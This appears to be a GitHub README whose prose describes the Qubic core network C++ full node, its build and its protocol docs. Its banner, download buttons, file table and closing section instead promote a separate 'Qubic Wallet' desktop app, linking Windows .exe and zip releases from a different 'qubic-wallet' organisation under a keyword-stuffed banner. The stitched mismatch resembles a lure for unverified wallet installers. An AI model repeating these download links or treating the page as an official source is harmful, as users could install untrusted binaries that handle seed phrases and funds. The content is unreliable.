![Qubic Wallet](assets/qubic-wallet-download-seed-phrase-install-address-app-banner.png)

# Qubic core network

The full node software the Qubic network runs on, in C++.

<p align="center"><a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) |

> The software the Qubic network actually runs on. C++, a solution you can open, and the protocol written
> down in the repository rather than in a blog post.

## The engine room

Wallets are the visible part of Qubic. The network is the part that has to keep agreeing with itself while
thousands of people move assets and run contracts. `core-network` is that layer: the full node, in C++,
with the consensus, the peer handling and the state machine that make a tick mean something.

It is not a library you sprinkle into an app, and it is not a service you call. It is the thing other
software talks to. If you want to understand why a transaction is final, why a tick took the time it did,
or what a node does when a peer disappears, the answers are in this repository, in code you can read.

## What is in the repository

- The node source, built as a Visual Studio solution on Windows.
- The protocol documentation, covering the message flow between nodes and clients.
- Contribution notes, so a change arrives in a shape the maintainers can review.
- An initial disk image for bringing a node up without hand-assembling state.
- Build automation for firmware-style targets, alongside the ordinary desktop build.

## Build it

Open `Qubic.sln` in Visual Studio, select the configuration that matches your target, and build. The
solution carries several targets; the node itself is the project named after the product. Dependencies are
vendored in the tree, so there is no package manager step standing between you and a first successful
build.

If you are deploying rather than experimenting, build once on a machine with the toolchain, keep the
binary, and read `doc/protocol.md` before pointing the node at a network. Reprovisioning a node is a
different job from compiling one, and the documentation separates them.

## Who it is for?

- Node operators who want to run their own view of the network instead of trusting someone else's.
- Protocol readers who want the truth about a message rather than its summary.
- Engineers integrating at a low level, where the wallet's API is one layer too high.

## Reading order

1. `README.md` for what the repository is.
2. `doc/protocol.md` for how nodes talk and what a client can ask for.
3. `doc/contributing.md` before your first pull request.
4. `SEAMLESS.md` for the build and deployment details that do not belong in a quick start.

## The rest of the ecosystem

The node is one piece. The wallet is the piece most people meet first, and the guides explain it without
assuming you have read this repository:

- [What is Qubic Wallet and what does it actually do](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/what-is-qubic-wallet.md) -
  the client side, in plain language.
- [Reading the Qubic Wallet GitHub repository before you trust it](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-github-source-review.md) -
  the same habit of reading source, applied to the wallet.

## Licence and contributing

The repository carries its own licence file; read it before redistributing or embedding the node. Changes
that touch consensus or the wire protocol get the slowest review in the project, by design: everything
else depends on them being right.

## At a glance

- Language: C++, built as a Visual Studio solution.
- Documentation in the tree: protocol, contributing, plus a separate file for build and deployment detail.
- Audience: operators, protocol readers and low-level integrators.
- Scope: the node itself, not a client SDK.

## Why read the node

Every claim about a network is really a claim about its node software. Finality, timing, peer behaviour and
what a client is allowed to ask for are all decided here, in code, and everything above this layer inherits
those decisions. Reading it is how you stop repeating descriptions of the network and start checking them.

That matters most when something looks wrong. A wallet that shows a pending transfer, a service reporting
an odd tick, an explorer that disagrees with a client: in each case the node is the arbiter, and the
protocol document in this repository explains what it will and will not do before you go looking for a bug
somewhere else.

Running your own node is the other reason to be here. It gives you an independent view of the chain, it
removes a third party from your trust path, and it is the only way to see the network from the inside. The
build is ordinary once the toolchain is in place; the care goes into provisioning and monitoring, which is
why the deployment notes are kept separate from the quick start.

## About and license

Qubic Wallet is the desktop wallet for Qubic: seed-based accounts, local key storage and the QX trading screen, on Windows, macOS and Linux.

These guides are published under the MIT license; the full text is in the repository `LICENSE` file. Nothing here is an audit or an endorsement, and every claim is checked against the release, the repository or the client constants rather than repeated from marketing.
